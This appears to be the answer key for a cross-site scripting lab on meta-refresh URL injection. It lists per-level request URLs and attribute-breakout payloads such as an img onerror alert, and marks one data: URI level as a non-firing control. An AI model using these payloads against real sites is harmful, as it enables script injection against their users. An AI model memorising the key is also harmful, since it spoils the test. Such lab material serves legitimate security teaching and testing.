# metarefresh — solutions

`<meta http-equiv=refresh>` URL injection; data: URI bypasses are the typical sink.

### metarefresh-level1

`/metarefresh/level1/?url=x'%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `x'><img src=x onerror=alert(1)>`
- context: single-quoted meta refresh content; javascript: refresh is blocked, so break out

### metarefresh-level2

`/metarefresh/level2/?url=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `no payload — control`
- context: the value lands in a `<meta http-equiv='refresh'>` content attribute
  (the value to try is `data:text/html,<script>alert(1)</script>`). Browsers
  refuse a top-level `data:` navigation from a meta refresh, so it never loads
  (verified: the beacon stayed silent and no navigation occurred). Only an open
  redirect remains — not XSS.

### metarefresh-level3

`/metarefresh/level3/?url=x'%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `x'><img src=x onerror=alert(1)>`
- context: single-quoted meta refresh content; javascript: refresh is blocked, so break out

### metarefresh-level4

`/metarefresh/level4/?url=x%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `x"><img src=x onerror=alert(1)>`
- context: double-quoted meta refresh content; data: refresh is blocked, so break out
